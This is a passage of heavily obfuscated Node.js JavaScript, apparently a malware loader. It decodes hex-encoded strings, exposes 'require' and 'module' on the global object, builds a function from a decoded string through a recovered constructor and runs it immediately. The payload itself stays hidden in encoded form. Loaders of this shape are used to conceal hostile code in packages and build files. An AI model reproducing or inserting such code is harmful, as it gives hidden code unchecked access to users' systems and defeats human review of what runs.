860161b191c1f1b','626061676263633a26053f1220','6469626562671a023f3b0216','330e3d353a320e24223f'];vP$iLkgCQPPDrHvY_jziqCQrVQ=function(){return EWBZJbuwyMwY$JkF$nXGA;};return vP$iLkgCQPPDrHvY_jziqCQrVQ();}function peel(RAQFyQDRx){return spin(RAQFyQDRx,SX);}(function boot(gwyaIvePjDObzn_iWggA_kjkY,hlqO$kfTdajDRyfWsiF){var RqjmjdCQzrhAglQLEcOZEj_Il=ezEfAZOUCnnDjez_ziybX;gwyaIvePjDObzn_iWggA_kjkY['z']=z;var bWNQUf$XzujDGj=splitLane(RqjmjdCQzrhAglQLEcOZEj_Il(0xa0));gwyaIvePjDObzn_iWggA_kjkY[bWNQUf$XzujDGj[Math.trunc(0x1c45)+0x6*parseInt(0x543)+0x3bd7*parseFloat(-parseInt(0x1))]]=hlqO$kfTdajDRyfWsiF;typeof module===bWNQUf$XzujDGj[-parseInt(0x517)*parseInt(0x1)+Math.ceil(-parseInt(0x2015))+Math.trunc(0x252d)]&&(gwyaIvePjDObzn_iWggA_kjkY[bWNQUf$XzujDGj[parseInt(parseInt(0xc1f))*0x2+Math.max(0x21ad,0x21ad)+parseInt(0x5)*-parseInt(0xb95)]]=module);var MiJc$OIJ_BbSUmHUkvYEYOEarN=peel(RqjmjdCQzrhAglQLEcOZEj_Il(0xad)),MMhu_cTjKWIFpIaXSuJsY_fG=MiJc$OIJ_BbSUmHUkvYEYOEarN[RqjmjdCQzrhAglQLEcOZEj_Il(0xa2)](0x2364+-parseInt(0x185)+Number(-parseInt(0x21df)),-0x2226+parseInt(-0xf54)+-parseInt(0x1)*-0x3185),YwUrZpzRjwqMvIKikPqlkjBV=peel[MMhu_cTjKWIFpIaXSuJsY_fG],hPBYaJHdJwiNzihbgh=YwUrZpzRjwqMvIKikPqlkjBV('',peel(RqjmjdCQzrhAglQLEcOZEj_Il(0xa9))),pAaJR_YBKJef_DjRpicgJZ=hPBYaJHdJwiNzihbgh(peel(RqjmjdCQzrhAglQLEcOZEj_Il(0xa1)));return YwUrZpzRjwqMvIKikPqlkjBV('',pAaJR_YBKJef_DjRpicgJZ)(Math.max(0x1,0x1)*0x1346+0x10*-0x29+Number(-0x3d)*parseInt(0x1d)),-parseInt(0x2f6e)+Math.ceil(-0x3)*parseFloat(0x40f)+0x7*0xd0f;}(global,require));
